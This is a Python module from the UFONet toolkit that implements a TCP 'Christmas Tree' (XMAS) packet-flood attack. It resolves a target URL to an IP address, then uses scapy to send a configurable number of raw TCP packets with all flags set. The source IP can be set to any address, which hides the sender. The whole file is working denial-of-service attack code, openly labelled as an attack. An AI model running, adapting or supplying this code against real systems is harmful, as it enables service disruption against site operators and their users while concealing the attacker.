#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket
import netifaces as ni

from core.mods.mod_config import REPORT_PER_ATTACK, XMAS_SPEED
try:
    from urlparse import urlparse
except:
    from urllib.parse import urlparse
try:
    from scapy.all import *
    from scapy.config import conf
except:
    print("\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-scapy'\n")
    sys.exit(2)


# UFONet TCP 'Christmas Tree' packet attack (XMAS)
def randIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

def randInt():
    x = random.randint(1,65535) # TCP ports
    return x

def get_iface(source):
    for ifname in ni.interfaces():
        try:
            address_list = ni.ifaddresses(ifname)[ni.AF_INET]
        except KeyError:
            continue
        # print(address_list)
        address_list = [i['addr'] for i in address_list]
        if source in address_list:
            return ifname
    return ""

def xmasize(ip, sport, rounds, source = None):
    n=0
    xmas_sent = 0
    ifname = get_iface(source)
    if len(ifname) > 0:
        s = conf.L3socket(iface = ifname)
    try:
        for x in range (0,int(rounds)):
            n=n+1
            s_zombie_port = randInt() 
            seq = randInt()
            window = randInt()
            IP_p = IP()
            IP_p.src = randIP()

            if source is None:
                # print("[Info] [XMAS] Using random source IP")
                IP_p.src = randIP()
            else:
                # print("[Info] [XMAS] Using given source IP")
                IP_p.src = source

            try:
                IP_p.dst = ip
            except:
                print("[Error] [AI] [XMAS] Imposible to resolve IP from 'target' -> [Aborting!]\n")
                break
            TCP_l = TCP()
            TCP_l.sport = s_zombie_port
            TCP_l.dport = sport
            TCP_l.seq = seq
            TCP_l.window = window
            TCP_l.flags = "UFP" # ALL FLAGS SET (like a XMAS tree)
            try:
                # send(IP_p/TCP_l, verbose=0)
                s.send(IP_p/TCP_l)
                # print("[Info] [AI] [XMAS] Firing 'ionized quartz' ["+str(n)+"] -> [IONIZING!]")
                xmas_sent += 1
                if xmas_sent % REPORT_PER_ATTACK == 0:
                    print("[Info] [AI] [XMAS] Fired 'ionized quartz' ["+str(xmas_sent)+"]")
                # time.sleep(1/XMAS_SPEED) # sleep time required for balanced sucess
            except Exception as e:
                print(e)
                print("[Error] [AI] [XMAS] Failed to engage with 'ionized quartz' ["+str(n)+"]")
    except:
        print("[Error] [AI] [XMAS] Failing to engage... -> Is still target online? -> [Checking!]")

class XMAS(object):
    def attacking(self, target, rounds, source = None):
        print("[Info] [AI] TCP 'Christmas Tree' (XMAS) is ready to fire: [" , rounds, "ionized quartzs ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
            sport = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            sport = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                url = urlparse(target)
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [XMAS] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        xmasize(ip, sport, rounds, source) # attack with XMAS using threading
